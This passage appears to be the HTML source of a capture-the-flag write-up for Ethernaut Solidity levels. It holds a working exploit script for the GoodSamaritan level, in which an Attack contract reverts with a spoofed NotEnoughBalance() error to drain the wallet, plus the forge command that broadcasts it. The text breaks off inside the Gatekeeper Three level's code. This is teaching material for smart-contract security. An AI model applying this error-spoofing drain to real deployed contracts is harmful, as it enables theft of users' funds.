&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferRemainder&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address dest_&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; transfer balance left
&lt;&#x2F;span&gt;&lt;span&gt;        coin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(dest_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;coin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balances&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setCoin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;Coin coin_&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        coin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;coin_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;interface &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;INotifyable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Would you be able to drain all the balance from his Wallet?&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;There in total three contract are given to us. &lt;code&gt;GoodSamaritan&lt;&#x2F;code&gt; contract deployes &lt;code&gt;Wallet&lt;&#x2F;code&gt; and &lt;code&gt;Coin&lt;&#x2F;code&gt; contracts.&lt;&#x2F;li&gt;
&lt;li&gt;Good samaritan will be the &lt;code&gt;owner&lt;&#x2F;code&gt; of the &lt;code&gt;Wallet&lt;&#x2F;code&gt; contract. And the wallet contract will have 10**6 Coin balances.&lt;&#x2F;li&gt;
&lt;li&gt;We are given with the GoodSamaritan instance address. We can able to call the &lt;code&gt;requestDonation()&lt;&#x2F;code&gt; function to get 10 coins from the GoodSamaritan&#x27;s Wallet.&lt;&#x2F;li&gt;
&lt;li&gt;One call to &lt;code&gt;requestDonation()&lt;&#x2F;code&gt; will get 10 coins only. To drain all the coins of the Wallet we need to call the &lt;code&gt;requestDonation()&lt;&#x2F;code&gt; function &lt;code&gt;100000&lt;&#x2F;code&gt; times which requires more gas.&lt;&#x2F;li&gt;
&lt;li&gt;Instead we can try to invoke the &lt;code&gt;withdrawRemainder()&lt;&#x2F;code&gt; function which will send all the coins at a time.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;withdrawRemainder()&lt;&#x2F;code&gt; is called when the &lt;code&gt;wallet.donate10(msg.sender)&lt;&#x2F;code&gt; returns error &lt;code&gt;NotEnoughBalance()&lt;&#x2F;code&gt; defined inside Wallet contract.&lt;&#x2F;li&gt;
&lt;li&gt;GoodSamaritan contract expects the error from the Wallet contract only. But as per the solidity docs, the error may be raised and bubbled up by any intermediary contract. That means we cannot predict the origin of the error.&lt;&#x2F;li&gt;
&lt;li&gt;So, can we raise error by ourself to the GoodSamaritan..? yes, When transfering 10 coins to the sender inside the &lt;code&gt;Coin&lt;&#x2F;code&gt; contract it notifies the sender if the sender is a contract.&lt;&#x2F;li&gt;
&lt;li&gt;This means it calls to our &lt;code&gt;msg.sender&lt;&#x2F;code&gt;, now we can implement the &lt;code&gt;notify()&lt;&#x2F;code&gt; function inside our Attack contract and revert with the &lt;code&gt;NotEnoughBalance()&lt;&#x2F;code&gt; error when receiving the 10 coins.&lt;&#x2F;li&gt;
&lt;li&gt;We should revert the &lt;code&gt;NotEnoughBalance()&lt;&#x2F;code&gt; error when only receiving the 10 coins not when the GoodSamaritan sending whole coins.&lt;&#x2F;li&gt;
&lt;li&gt;For this I used the amount parameter sent by the Coin contract through the notify call.&lt;&#x2F;li&gt;
&lt;li&gt;Now GoodSamaritan gets the error &lt;code&gt;NotEnoughBalance()&lt;&#x2F;code&gt; when it sends 10 coins to us, immediately it will send whole coins to us.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;GoodSamaritanSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;GoodSamaritan.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GoodSamaritanSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    GoodSamaritan public gs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GoodSamaritan&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Wallet Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wallet&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Coin Address : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;coin&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Balance of Wallet&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;coin&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balances&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wallet&lt;&#x2F;span&gt;&lt;span&gt;())))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Balance of Wallet&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;coin&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balances&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;wallet&lt;&#x2F;span&gt;&lt;span&gt;())))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;NotEnoughBalance&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    GoodSamaritan public gs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GoodSamaritan&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5887fc48Bd661cCD104998d3BB556b1879aC4cC2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        gs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;requestDonation&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;){ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; only revert when receiving 10 coins
&lt;&#x2F;span&gt;&lt;span&gt;            revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;NotEnoughBalance&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;GoodSamaritanSolve.s.sol:GoodSamaritanSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;28-gatekeeper-three&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#28-gatekeeper-three&quot; aria-label=&quot;Anchor link for: 28-gatekeeper-three&quot;&gt;28 Gatekeeper Three&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;GatekeeperThree.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SimpleTrick {
&lt;&#x2F;span&gt;&lt;span&gt;  GatekeeperThree public target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public trick&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  uint private password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor &lt;&#x2F;span&gt;&lt;span&gt;(address payable _target) {
&lt;&#x2F;span&gt;&lt;span&gt;    target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GatekeeperThree&lt;&#x2F;span&gt;&lt;span&gt;(_target)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;checkPassword&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _password&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(_password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;password) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;trickInit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    trick &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;trickyTrick&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;trick) {
